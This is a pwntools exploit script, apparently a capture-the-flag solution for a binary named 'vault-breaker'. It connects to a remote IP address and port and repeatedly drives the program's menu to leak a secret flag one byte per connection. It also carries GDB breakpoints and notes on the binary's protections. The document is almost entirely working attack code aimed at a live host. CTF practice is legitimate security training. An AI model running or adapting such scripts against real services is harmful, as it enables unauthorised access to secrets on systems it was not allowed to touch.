#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vault-breaker
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vault-breaker')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b secure_password
b *new_key_gen+299
b *secure_password+410
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./.glibc/'
flag = ''

for i in range(0x20):
    #io = start()
    io = remote('64.227.37.214', 31425)
    io.sendafter(b'>', b'1')
    io.sendafter(b': ', str(i))
    io.sendafter(b'>', b'2')
    io.recvuntil('Vault: ')
    flag = io.recvline().rstrip()[i]
    print("Flag: ", chr(flag))


io.interactive()
